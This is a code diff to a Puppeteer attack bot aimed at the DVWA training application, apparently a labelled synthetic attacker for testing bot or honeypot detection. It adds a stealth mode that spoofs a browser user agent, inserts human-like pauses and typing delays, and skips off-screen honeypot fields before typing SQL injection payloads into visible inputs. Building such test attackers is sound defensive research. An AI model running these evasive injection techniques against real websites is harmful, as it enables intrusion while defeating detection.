@@ -21,6 +21,19 @@ const SECURITY_LEVEL = process.env.DVWA_SECURITY_LEVEL || 'low';
 const SESSIONS = parseInt(process.env.ALLM_SESSIONS || '3', 10);
 const DVWA_USER = process.env.DVWA_USER || 'admin';
 const DVWA_PASS = process.env.DVWA_PASS || 'password';
+const STEALTH = ['1', 'true', 'yes'].includes(
+    (process.env.ALLM_STEALTH || 'false').toLowerCase()
+);
+const STEALTH_UA = (
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ' +
+    'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+);
+
+function humanPause() {
+    if (!STEALTH) return Promise.resolve();
+    const ms = 2500 + Math.random() * 4000;
+    return new Promise((res) => setTimeout(res, ms));
+}
 
 const PAYLOADS = [
     "1' OR '1'='1",
@@ -102,31 +115,56 @@ async function attackPage(page, path) {
     } catch {
         return;
     }
-    const inputs = await page.$$(
+    let inputs = await page.$$(
         'input[type="text"]:not([disabled]):not([readonly]), textarea:not([disabled]):not([readonly])'
     );
     if (!inputs.length) return;
     const payload = PAYLOADS[Math.floor(Math.random() * PAYLOADS.length)];
-    for (const inp of inputs) {
-        try { await inp.evaluate((el) => (el.value = '')); } catch {}
-        try { await inp.type(payload); } catch {}
+    if (STEALTH) {
+        // Drop off-screen / aria-hidden inputs (the invisible_field
+        // honeypot is positioned at -9999px) — fill ONE visible input
+        // with a human-typed payload.
+        const visible = [];
+        for (const inp of inputs) {
+            try {
+                const box = await inp.boundingBox();
+                if (!box) continue;
+                if (box.x < 0 || box.y < 0) continue;
+                if (box.width < 5 || box.height < 5) continue;
+                visible.push(inp);
+            } catch {}
+        }
+        if (!visible.length) return;
+        try {
+            await visible[0].click({ clickCount: 1 });
+            await visible[0].type(payload, { delay: 80 + Math.random() * 100 });
+        } catch {}
+    } else {
+        for (const inp of inputs) {
+            try { await inp.evaluate((el) => (el.value = '')); } catch {}
+            try { await inp.type(payload); } catch {}
+        }
     }
     try {
         const submit = await page.$('input[type="submit"], button[type="submit"]');
         if (submit) await submit.click();
         await page.waitForNetworkIdle({ idleTime: 200, timeout: 3000 }).catch(() => {});
     } catch {}
+    await humanPause();
 }
 
 async function runSession(browser, sessionIdx) {
     const payload = buildPayload(
-        'agent', LABEL, 'puppeteer_bot', '0.1.0',
-        { engine: 'puppeteer', paths: VULN_PATHS },
+        'agent', LABEL, 'puppeteer_bot', '0.2.0',
+        { engine: 'puppeteer', paths: VULN_PATHS, stealth: STEALTH },
     );
+    payload.stealth = STEALTH;
     const headers = labelHeaders(payload);
+    if (STEALTH) headers['User-Agent'] = STEALTH_UA;
 
     const context = await browser.createBrowserContext();
     const page = await context.newPage();
+    if (STEALTH) await page.setUserAgent(STEALTH_UA);
     await page.setExtraHTTPHeaders(headers);
 
     let pages = 0;
@@ -155,7 +193,8 @@ async function runSession(browser, sessionIdx) {
 }
 
 async function main() {
-    console.log(`[${LABEL}] target=${TARGET} target_app=${TARGET_APP} sessions=${SESSIONS}`);
+    const mode = STEALTH ? 'stealth' : 'fast';
+    console.log(`[${LABEL}] target=${TARGET} target_app=${TARGET_APP} mode=${mode} sessions=${SESSIONS}`);
     const browser = await puppeteer.launch({
         headless: true,
         executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium',
